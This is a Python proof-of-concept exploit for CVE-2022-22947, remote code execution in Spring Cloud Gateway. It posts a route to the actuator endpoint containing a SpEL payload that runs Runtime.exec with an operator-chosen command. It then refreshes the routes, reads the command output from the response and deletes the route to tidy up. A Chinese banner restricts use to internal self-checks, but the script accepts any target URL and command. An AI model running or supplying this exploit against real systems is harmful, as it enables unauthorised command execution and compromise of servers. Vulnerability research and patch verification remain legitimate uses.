import argparse
import requests
import json
import re
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

def send(url,command):
    url1 = url + "/actuator/gateway/routes/t1"
    url2 = url + "/actuator/gateway/refresh"
    url3 = url1
    url4 = url1
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Content-Type": "application/json",
        "Connection": "close"
    }

    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
    }

    data1 = '''{\r
      "id": "t1",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "CMD","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"'''+command+'''\\"}).getInputStream()))}"}\r
        }],\r
      "uri": "http://1.com",\r
      "order": 0\r
    }'''

    data2 = " "

    req1 = requests.post(url = url1,headers = headers1,data = data1,json = json,verify = False)#通过/actuator/gateway/routes/接口创建恶意路由
    if req1.status_code == 201:
        req2 = requests.post(url2,headers = headers1,json = data2,verify = False)#刷新路由
        if req2.status_code == 200:
            req3 = requests.get(url3,headers = headers2,verify = False)#获取命令执行回显信息
            if req3.status_code == 200 and "CMD" in req3.text:
                req4 = requests.delete(url4, headers=headers2, verify=False)#删除恶意路由
                if req4.status_code == 200:
                    return req3.text

if __name__ == "__main__":
    print("." * 50)
    print('''
    ===CVE-2022-22947 SPRINGCLOUD GATEWAY SPEL RCE===
    本工具仅适用于企业内部自查自纠，请勿用于恶意行为。
    请勿频繁使用，由于频繁刷新路由造成的一切影响由使用者自负。
    
    example:python3 poc.py -t http://ip:port
            python3 poc.py -t http://ip:port -c whoami
    ''')

    print("."*50)
    print()
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-t',type=str,help='input your target')
    parser.add_argument('-c',type=str,help='input your command')
    #parser.add_argument('-f',type=str,help='')  批量，有空再写吧
    args = parser.parse_args()
    if args.t and args.c is None:
        command = "id"
        bak = send(args.t,command)
        #jsonobj = json.loads(bak)
        result = re.findall(r"CMD = '(.+?)\\n'", bak)
        print(result)
        #print(jsonobj['filters'])
    if args.t is not None and args.c is not None:
        bak = send(args.t,args.c)
        result = re.findall(r"CMD = '(.+?)\\n'", bak)
        print(result)



        
